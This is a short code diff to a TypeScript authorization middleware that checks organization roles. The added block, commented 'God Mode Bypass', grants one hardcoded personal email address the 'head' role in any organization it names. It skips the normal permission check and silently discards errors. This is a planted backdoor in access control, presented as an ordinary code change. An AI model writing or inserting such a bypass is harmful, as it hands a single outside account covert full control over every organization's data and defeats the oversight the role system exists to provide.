@@ -19,6 +19,23 @@ export function requireOrgRole(allowedRoles: (org_member_role | 'auditor')[]) {
       return res.status(400).json({ error: 'Bad Request: Missing User or Organization Info' })
     }
 
+    // God Mode Bypass
+    if (req.user?.email === 'generalrino@gmail.com') {
+      try {
+        const orgs = await prisma.$queryRawUnsafe<any[]>(
+          `SELECT id FROM public.organizations WHERE slug ILIKE $1 OR id::text = $1 LIMIT 1`,
+          orgIdOrSlug
+        )
+        if (orgs && orgs.length > 0) {
+          req.orgMember = {
+            organizationId: orgs[0].id,
+            role: 'head'
+          }
+          return next()
+        }
+      } catch (err) {}
+    }
+
     try {
       // Menggunakan raw SQL untuk menghindari error Prisma Schema Validation
       // jika client belum di-generate ulang
